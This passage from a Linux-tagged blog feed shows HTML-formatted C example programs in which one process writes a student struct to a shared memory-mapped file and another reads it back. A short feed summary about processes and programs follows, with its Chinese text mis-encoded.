class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> = &#123;</span><span class="number">1</span>,<span class="string">"elssm"</span>,<span class="number">22</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;stu,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">stu.id++;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯è¯»å–æ–‡ä»¶çš„ä»£ç <code>mmap_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"id = %d,name = %s,age = %d\n"</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;è¿›ç¨‹å’Œç¨‹åº&quot;&gt;&lt;a href=&quot;#è¿›ç¨‹å’Œç¨‹åº&quot; class=&quot;headerlink&quot; title=&quot;è¿›ç¨‹å’Œç¨‹åº&quot;&gt;&lt;/a&gt;è¿›ç¨‹å’Œç¨‹åº&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;ç¨‹åºï¼šåªå ç”¨ç£ç›˜ç©ºé—´&lt;/li&gt;
&lt;li&gt;è¿›ç¨‹ï¼šè¿è¡Œèµ·æ¥çš„ç¨‹åºï¼Œå ç”¨å†…å­˜ã€CPUç­‰ç³»ç»Ÿèµ„æº&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
